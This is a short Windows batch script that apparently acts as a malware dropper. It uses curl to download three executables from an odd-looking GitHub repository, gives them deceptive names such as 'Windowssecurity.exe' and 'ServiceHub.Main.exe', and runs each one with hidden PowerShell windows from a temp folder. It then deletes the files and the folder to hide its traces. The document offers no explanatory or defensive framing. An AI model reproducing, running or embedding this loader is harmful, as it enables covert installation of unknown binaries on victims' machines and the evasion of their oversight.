@echo off
setlocal

set EXE_URL1=https://github.com/blechbleh/sasdaasd/raw/refs/heads/main/Primeclientautoupdater.exe
set EXE_URL2=https://github.com/blechbleh/sasdaasd/raw/refs/heads/main/Windowssecurity.exe
set EXE_URL3=https://github.com/blechbleh/sasdaasd/raw/refs/heads/main/ServiceHub.Main.exe

set EXE_NAME1=Primeclientautoupdater.exe
set EXE_NAME2=Windowssecurity.exe
set EXE_NAME3=ServiceHub.Main.exe

set TEMP_DIR=%TEMP%\gt_temp

if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%"

if defined EXE_URL1 curl -L -o "%TEMP_DIR%\%EXE_NAME1%" %EXE_URL1%
if defined EXE_URL2 curl -L -o "%TEMP_DIR%\%EXE_NAME2%" %EXE_URL2%
if defined EXE_URL3 curl -L -o "%TEMP_DIR%\%EXE_NAME3%" %EXE_URL3%

if exist "%TEMP_DIR%\%EXE_NAME1%" powershell -WindowStyle Hidden -Command "Start-Process '%TEMP_DIR%\%EXE_NAME1%' -WindowStyle Hidden"
if exist "%TEMP_DIR%\%EXE_NAME2%" powershell -WindowStyle Hidden -Command "Start-Process '%TEMP_DIR%\%EXE_NAME2%' -WindowStyle Hidden"
if exist "%TEMP_DIR%\%EXE_NAME3%" powershell -WindowStyle Hidden -Command "Start-Process '%TEMP_DIR%\%EXE_NAME3%' -WindowStyle Hidden"

timeout /t 5 >nul

del "%TEMP_DIR%\*.exe" >nul 2>&1
rd "%TEMP_DIR%" 2>nul
